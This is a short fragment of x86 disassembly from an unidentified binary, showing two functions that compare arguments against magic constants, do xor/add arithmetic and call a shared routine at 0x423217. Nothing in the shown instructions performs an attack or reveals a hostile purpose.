  423321:	add    eax,esi
  423323:	cmp    ecx,eax
  423325:	je     0x423383
  423327:	mov    eax,DWORD PTR [esp+0x18]
  42332b:	mov    ecx,DWORD PTR [esp+0x14]
  42332f:	xor    eax,edi
  423331:	add    eax,esi
  423333:	imul   eax,DWORD PTR [esp+0x1c]
  423338:	mov    DWORD PTR [ecx],eax
  42333a:	jmp    0x423383
  42333c:	mov    ecx,DWORD PTR [ebp+0x20]
  42333f:	cmp    ecx,0xf89c85b9
  423345:	jne    0x42334e
  423347:	push   0xf89c85b8
  42334c:	jmp    0x42336c
  42334e:	mov    ecx,DWORD PTR [ebp+0x20]
  423351:	cmp    ecx,0xf89c85b8
  423357:	jne    0x423360
  423359:	push   0xf89c85bf
  42335e:	jmp    0x42336c
  423360:	mov    ecx,DWORD PTR [ebp+0x20]
  423363:	cmp    ecx,0xf89c85bf
  423369:	jne    0x423383
  42336b:	push   eax
  42336c:	push   DWORD PTR [ebp+0x1c]
  42336f:	push   DWORD PTR [ebp+0x18]
  423372:	push   ebx
  423373:	push   DWORD PTR [ebp+0x10]
  423376:	push   DWORD PTR [ebp+0xc]
  423379:	push   DWORD PTR [ebp+0x8]
  42337c:	call   0x423217
  423381:	mov    DWORD PTR [ebx],eax
  423383:	mov    eax,DWORD PTR [ebx]
  423385:	pop    edi
  423386:	pop    esi
  423387:	pop    ebx
  423388:	mov    esp,ebp
  42338a:	pop    ebp
  42338b:	ret    0x1c
  42338e:	push   ebp
  42338f:	mov    ebp,esp
  423391:	sub    esp,0xc
  423394:	mov    eax,0xf89c85b5
  423399:	mov    DWORD PTR [ebp-0x8],eax
  42339c:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  4233a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4233a6:	xor    ecx,0x75108b3
  4233ac:	add    ecx,0x3272fa
  4233b2:	mov    DWORD PTR [ebp-0x4],ecx
  4233b5:	mov    ecx,DWORD PTR [ebp+0xc]
  4233b8:	push   eax
  4233b9:	mov    DWORD PTR [ebp+0xc],ecx
  4233bc:	push   DWORD PTR [ebp+0xc]
  4233bf:	lea    eax,[ebp-0x4]
  4233c2:	push   DWORD PTR [ebp+0x8]
  4233c5:	push   eax
  4233c6:	push   DWORD PTR [ebp+0xc]
  4233c9:	push   DWORD PTR [ebp-0xc]
  4233cc:	push   DWORD PTR [ebp-0x8]
  4233cf:	call   0x423217
  4233d4:	mov    DWORD PTR [ebp-0x4],eax
  4233d7:	mov    eax,DWORD PTR [ebp-0x4]
  4233da:	leave  
  4233db:	ret    0x8
	...
